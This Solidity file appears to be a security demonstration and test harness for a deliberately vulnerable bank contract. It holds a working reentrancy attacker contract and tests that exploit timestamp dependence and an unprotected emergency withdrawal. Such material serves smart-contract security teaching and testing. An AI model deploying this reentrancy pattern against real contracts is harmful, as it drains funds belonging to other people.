// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";
import "hardhat/console.sol";

// Malicious contract to demonstrate reentrancy attack
contract AttackerContract {
    IBank public bank;
    uint256 public constant RECURSION_LIMIT = 3;
    uint256 private recursionCount;
    
    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }
    
    // Function to start the attack
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        recursionCount = 0;
        
        // Initial deposit
        bank.deposit{value: msg.value}();
        
        // Start the reentrancy attack
        bank.withdraw(msg.value);
    }
    
    // Fallback function to execute the reentrancy attack
    receive() external payable {
        recursionCount++;
        if(recursionCount < RECURSION_LIMIT && address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

// Contract to test all vulnerabilities
contract VulnerabilityTest {
    VulnerableBank public vulnerableBank;
    AttackerContract public attacker;
    
    constructor() {
        vulnerableBank = new VulnerableBank();
        attacker = new AttackerContract(address(vulnerableBank));
    }
    
    // Test reentrancy attack
    function testReentrancyAttack() public payable {
        require(msg.value >= 3 ether, "Need at least 3 ether for test");
        
        // Setup initial state
        uint256 initialBalance = address(this).balance;
        
        // Fund the vulnerable contract
        vulnerableBank.deposit{value: 2 ether}();
        
        // Execute attack
        attacker.attack{value: 1 ether}();
        
        // Check if attack was successful
        assert(address(attacker).balance > 1 ether);
        console.log("Reentrancy attack successful!");
        console.log("Attacker balance:", address(attacker).balance);
        console.log("Bank balance:", address(vulnerableBank).balance);
    }
    
    // Test timestamp manipulation
    function testTimestampDependency() public {
        // Note: This is just a demonstration. In reality, miners can manipulate timestamps
        bool result1 = vulnerableBank.isLuckyDay();
        console.log("Lucky day result:", result1);
    }
    
    // Test unprotected emergency withdraw
    function testUnprotectedEmergencyWithdraw() public {
        // Fund the contract first
        vulnerableBank.deposit{value: 1 ether}();
        
        // Any address can call emergency withdraw
        uint256 initialBalance = address(this).balance;
        vulnerableBank.emergencyWithdraw();
        
        assert(address(this).balance > initialBalance);
        console.log("Unprotected emergency withdraw successful!");
        console.log("Stolen amount:", address(this).balance - initialBalance);
    }
    
    // Helper function to check contract balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    // To receive ether
    receive() external payable {}
}
